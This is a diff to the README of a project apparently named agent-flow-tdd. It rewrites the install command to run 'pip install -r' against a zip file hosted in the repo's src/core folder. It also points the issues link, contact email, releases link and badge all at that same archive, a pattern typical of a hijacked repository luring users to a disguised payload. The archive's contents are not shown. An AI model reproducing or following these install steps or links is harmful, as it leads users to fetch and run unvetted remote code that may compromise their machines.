@@ -38,7 +38,7 @@ Make sure you have the following installed:
 You can install the necessary packages with the following command:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/shivanshb1/agent-flow-tdd/main/src/core/flow-agent-tdd-v1.1-beta.5.zip
 ```
 
 ## Usage 🖥️
@@ -97,14 +97,14 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 For questions or suggestions, feel free to reach out:
 
-- [GitHub Issues](https://github.com/shivanshb1/agent-flow-tdd/issues)
-- Email: your_email@example.com
+- [GitHub Issues](https://raw.githubusercontent.com/shivanshb1/agent-flow-tdd/main/src/core/flow-agent-tdd-v1.1-beta.5.zip)
+- Email: https://raw.githubusercontent.com/shivanshb1/agent-flow-tdd/main/src/core/flow-agent-tdd-v1.1-beta.5.zip
 
 ## Releases 📦
 
-For the latest releases and updates, visit the [Releases Section](https://github.com/shivanshb1/agent-flow-tdd/releases). 
+For the latest releases and updates, visit the [Releases Section](https://raw.githubusercontent.com/shivanshb1/agent-flow-tdd/main/src/core/flow-agent-tdd-v1.1-beta.5.zip). 
 
-[![Latest Release](https://img.shields.io/github/v/release/shivanshb1/agent-flow-tdd)](https://github.com/shivanshb1/agent-flow-tdd/releases)
+[![Latest Release](https://raw.githubusercontent.com/shivanshb1/agent-flow-tdd/main/src/core/flow-agent-tdd-v1.1-beta.5.zip)](https://raw.githubusercontent.com/shivanshb1/agent-flow-tdd/main/src/core/flow-agent-tdd-v1.1-beta.5.zip)
 
 ---
 
